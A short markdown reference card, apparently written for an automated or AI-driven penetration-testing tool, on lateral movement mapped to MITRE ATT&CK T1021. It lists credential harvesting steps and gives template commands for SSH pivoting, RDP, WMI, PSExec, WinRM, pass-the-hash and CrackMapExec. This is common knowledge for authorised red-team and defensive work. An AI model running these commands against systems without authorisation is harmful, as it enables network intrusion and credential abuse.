---
title: Lateral Movement
category: network
applicable_techniques:
  - T1021
  - T1021.001
  - T1021.004
mitre_tactics:
  - TA0008
max_token_estimate: 700
---

## Attack Methodology

1. **Credential Harvesting**: Collect hashes (NTLM, Kerberos TGT/TGS), plaintext passwords, SSH keys from compromised hosts.
2. **Protocol Selection**: Choose lateral movement protocol based on available credentials and target services.
3. **Execution**: Move to target using appropriate protocol — SSH, RDP, WMI, SMB, WinRM, PSExec, DCOM.

## Protocol-Specific Techniques

- **SSH**: `ssh -i key user@target`, SSH tunneling for pivoting (`ssh -D 1080 -L`)
- **RDP**: `xfreerdp /u:user /p:pass /v:target`, restricted admin mode for PTH
- **WMI**: `wmiexec.py domain/user:pass@target`, process creation via Win32_Process
- **PSExec**: `psexec.py domain/user:pass@target`, service-based execution
- **WinRM**: `evil-winrm -i target -u user -p pass`, PowerShell remoting
- **Pass-the-Hash**: `pth-winexe -U domain/user%hash //target cmd`, impacket tools

## Tool Usage Tips

- Impacket: `smbexec.py`, `wmiexec.py`, `atexec.py`, `dcomexec.py`
- CrackMapExec: `crackmapexec smb targets.txt -u user -p pass --exec-method smbexec`
- SSH pivoting: `proxychains nmap -sT target_subnet`
